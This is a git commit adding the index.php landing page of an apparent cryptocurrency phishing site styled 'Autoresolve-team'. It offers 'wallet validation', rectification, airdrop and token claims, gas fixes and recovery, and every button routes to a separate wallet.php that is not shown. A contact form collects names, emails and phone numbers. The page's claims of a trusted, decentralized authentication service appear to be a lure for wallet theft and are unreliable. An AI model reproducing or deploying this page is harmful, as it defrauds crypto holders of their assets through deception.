d4ef17deeba7e13a695c60a2dad3ce376f90cef3
blinkzzy <68962747+blinkzzy@users.noreply.github.com>
2023-03-28 01:05:15 -0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,105 @@
+<!doctype html>
+<html data-n-head-ssr lang="en" data-n-head="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>Autoresolve-team - Bitcoin And Crypto Currency</title>
+    <meta data-n-head="ssr" charset="utf-8">
+    <meta data-n-head="ssr" name="viewport" content="width=device-width,initial-scale=1">
+    <meta data-n-head="ssr" data-hid="description" name="description" content="">
+    <meta data-n-head="ssr" name="format-detection" content="telephone=no">
+    <link data-n-head="ssr" rel="icon" type="image/x-icon" href="/favicon.ico">
+    <link data-n-head="ssr" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css">
+    <link data-n-head="ssr" rel="preconnect" href="https://fonts.googleapis.com">
+    <link data-n-head="ssr" rel="preconnect" href="https://fonts.gstatic.com">
+    <link data-n-head="ssr" rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap">
+    <script data-n-head="ssr" src="https://widgets.coingecko.com/coingecko-coin-price-marquee-widget.js">
+      
+    </script>
+    <link rel="preload" href="js/19c491e.js" as="script">
+    <link rel="preload" href="js/d62be5f.js" as="script">
+    <link rel="preload" href="js/e08b9e0.js" as="script">
+    <link rel="preload" href="js/6c4caef.js" as="script">
+    <link rel="preload" href="js/c8e925b.js" as="script">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/bootsrap.css">
+    <style data-vue-ssr-id="7f914dc6:0 6de55d07:0 215d2193:0 66e1543a:0 43f54af2:0 3ea290c3:0 6165e449:0 7e56e4e3:0 05df1fb2:0">
+ </style>
+
+  </head>
+  <body style="background-color: rgb(0, 0, 0);">
+    <div data-server-rendered="true" id="__nuxt">
+        <!----><div id="__layout">
+            <div>
+                <main data-v-8e75d4bc>
+                <div class="home-2" data-v-8e75d4bc>
+                    <div id="page-preloader" style="opacity:-.0166654;display:none" data-v-8e75d4bc>
+                        <div class="theme-loader" data-v-8e75d4bc>Autoresolve-team</div></div> 
+                        <header class="main-header header-2" data-v-8e75d4bc>
+                            <div data-v-8e75d4bc><div data-v-8e75d4bc><div data-v-8e75d4bc><div data-v-8e75d4bc><div style="height:40px;padding:0;margin:0;width:100%" data-v-8e75d4bc><coingecko-coin-price-marquee-widget coin-ids="bitcoin,eos,ethereum,litecoin,ripple,avalanche-2,usdd" currency="usd" background-color="#000000" locale="en" font-color="#ffffff" data-v-8e75d4bc></coingecko-coin-price-marquee-widget></div></div></div></div></div></header> <div class="tp-banner-container" style="overflow:visible" data-v-8e75d4bc><div class="tp-banner revslider-initialised tp-simpleresponsive hovered" style="max-height:550px;height:550px" data-v-8e75d4bc><div style="width:100%;height:100%" data-v-8e75d4bc><img src="img/bn-bg1.png" alt class="w-full h-full object-cover" data-v-8e75d4bc></div> <div class="home-slide-overlay flex items-center" data-v-8e75d4bc><div class="mx-3 md:mx-0 md:px-40" data-v-8e75d4bc><h1 class="uppercase text-3xl md:text-4xl text-white" data-v-8e75d4bc>
+            Trusted Platform to Manage all Wallet Validation and decentralized
+            Apps
+          </h1> <div class="mt-10" data-v-8e75d4bc><a href="wallet.php" class="btn-style mr-2 btn-border" data-v-8e75d4bc>Learn More</a> <a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Resolve</a></div></div></div></div></div> <section id="service" class="section-padding" data-v-8e75d4bc><div class="container" data-v-8e75d4bc><div data-v-8e75d4bc><div class="text-center" data-v-8e75d4bc><div class="section-title" data-v-8e75d4bc><h3 data-v-8e75d4bc>
+            Autoresolve-team
+                <span style="color:rgb(0, 0, 0);width:10%" data-v-8e75d4bc>Authentication</span></h3> <p data-v-8e75d4bc>
+                    Autoresolve-team is a decentralized platform and network that
+                blends Blockchain with Autoresolve, incorporating Blockchain aspects
+                such as non-custodial management, Micropools, rapid liquidity,
+                and decentralized governance. Each procedure must be completed
+                in its entirety. The authentication of wallet will be finished
+                as follows.
+              </p></div></div></div>
+               <div style="background: rgb(50, 48, 48);" class="text-center grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-5" data-v-8e75d4bc>
+                <div  data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/whitelist.svg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Whitelist / Pre sale</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/Rectification.2c35097.png" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Rectification</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/custom-broker.svg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Clear Cache</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/bitcoin-currency-exchange.svg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Buying and Selling</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/Claim.eb262f4.png" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Claim Reward</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/airdrop.385beb5.jpg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Claim Airdrop</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/check-mark.svg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Validation</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/wealth.svg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Nft reveal</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/bridge.c21df55.jpg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Bridge</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/Recovery.85b8e31.jpg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Recovery</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/website-migration.svg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Migration</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc>
+                    <div  class="single-address" data-v-8e75d4bc>
+                    <div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc>
+                    <img src="img/dollar_bag.2e4906a.png" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Claim Token</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> <div data-v-8e75d4bc><div class="single-address" data-v-8e75d4bc><div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/dollar-stack-up.svg" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Staking</h4></div>
+               <div  class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div> 
+               <div data-v-8e75d4bc >
+               <div class="single-address" data-v-8e75d4bc>
+                <div class="single-address-icon flex items-center justify-center" data-v-8e75d4bc><img src="img/fix.6951cd6.png" style="width:150px;height:150px;object-fit:cover" data-v-8e75d4bc></div> <div class="single-address-dec" data-v-8e75d4bc><h4 data-v-8e75d4bc>Fix Gas</h4></div> <div class="single-address-link" data-v-8e75d4bc><a href="wallet.php" class="btn-style btn-filled" data-v-8e75d4bc>Choose</a></div></div></div></div></div></section>
+               <section style="background-color: rgb(13, 13, 13);" id="promot" class="section-padding bg-gray" data-v-8e75d4bc><div class="container" data-v-8e75d4bc><div data-v-8e75d4bc><div data-v-8e75d4bc><div class="col-12 text-left" data-v-8e75d4bc><div class="section-title-2" data-v-8e75d4bc><h3 data-v-8e75d4bc style="color: skyblue;">Request <span data-v-00000 style="color: rgb(204, 170, 170);">free Assistance</span></h3></div></div></div>
+                <div class="home-p-form-wrapper" data-v-8e75d4bc><div class="home-p-form" data-v-8e75d4bc>
+                  <form action="contact.php" method="post" data-v-8e75d4bc><div class="row" data-v-8e75d4bc><div class="form-group col-lg-6 mb-3" data-v-8e75d4bc><input name="aname" id="afirst-name" placeholder="Your Name*" required class="form-control" data-v-8e75d4bc></div> <div class="form-group col-lg-6 mb-3" data-v-8e75d4bc><input name="aemail" id="aemail" placeholder="Email id*" required type="email" class="form-control" data-v-8e75d4bc></div> <div class="form-group col-lg-6 mb-3" data-v-8e75d4bc><input name="aphone" id="aphone" placeholder="Phone Number*" required class="form-control" data-v-8e75d4bc></div> <div class="form-group col-lg-6 mb-3" data-v-8e75d4bc><input name="asubject" id="asubject" placeholder="Subject" required class="form-control" data-v-8e75d4bc></div> <div class="form-group col-lg-12 mb-3" data-v-8e75d4bc><textarea rows="6" name="rmessage" placeholder="Your Message Here..." required class="form-control" data-v-8e75d4bc></textarea></div>
+                 <div class="form-group col-lg-5 mb-lg-0 mb-md-0 mb-2 pr-0" data-v-8e75d4bc><button type="submit" class="mt-8 w-full py-3 text-white text-base submit-button-4 w-button" style="background:purple">
+                 SEND MESSAGE
+                      </button></div></div></form></div></div></div></div></section>
+               <section id="calltoaction" class="calltoaction-padding section-padding bg-theme" style="background: black;" data-v-8e75d4bc><div class="auto-container" data-v-8e75d4bc><div class="row" data-v-8e75d4bc><div class="col-12 mx-auto text-center" data-v-8e75d4bc><div class="calltoaction-two-wrap mb-4" data-v-8e75d4bc>
+                <h4  class="text-uppercase" data-v-8e75d4bc style="color: rgb(204, 170, 170);" >Need More Service?</h4> <p data-v-8e75d4bc>
+                Cryptocurrency wallets provide users with a digital solution
+                for securely storing and managing blockchain assets and
+                cryptocurrencies. These wallets allow users to spend, receive,
+                and trade cryptocurrencies. While some cryptocurrency wallets
+                may only provide support for a single cryptocurrency, many are
+                multi-asset solutions, allowing users to hold multiple
+                cryptocurrencies, including Bitcoin, Bitcoin Cash, Ethereum,
+                and Litecoin, among many others. These solutions ensure that
+                the owner of the cryptocurrencies and blockchain assets is the
+                only entity who can access the funds by requiring elaborate
+                passwords and other security measures. Users can view or
+                access cryptocurrency wallets from smartphones and computers.
+              </p></div> <a href="/" class="wow fadeInDown btn-style btn-border btn-border-3" style="visibility:visible;animation-name:fadeInDown" data-v-8e75d4bc>Contact Us <i class="icofont icofont-hand-right" data-v-8e75d4bc></i></a></div></div></div></section> 
+              
+              <div class="footer-bottom-area">
+                <div class="container">
+                    <div class="footer-border">
+                        <div class="row d-flex justify-content-between align-items-center">
+                            <div class="col-xl-10 col-lg-9 ">
+                                <div class="footer-copy-right">
+                                    <p><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
+  Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved |made with <i class="fa fa-heart" aria-hidden="true"></i> by <a href="" target="_blank">AUTORESOLVE</a>
+  <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
+                                </div>
+                            </div>
+                           
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scroll Up -->
+    <div id="back-top" >
+        <a title="Go to Top" href="#"> <i class="fas fa-level-up-alt"></i></a>
+    </div> <div id="etrack-container" data-v-8e75d4bc></div> <div data-v-8e75d4bc></div></div></main></div></div></div><script>window.__NUXT__=function(e){return{layout:"default",data:[{}],fetch:{},error:e,serverRendered:!0,routePath:"/",config:{_app:{basePath:"/",assetsPath:"/_nuxt/",cdnURL:e}}}}(null)</script><script src="/_nuxt/19c491e.js" defer></script><script src="/_nuxt/c8e925b.js" defer></script><script src="/_nuxt/d62be5f.js" defer></script><script src="/_nuxt/e08b9e0.js" defer></script><script src="/_nuxt/6c4caef.js" defer></script>
+  </body>
+</html>
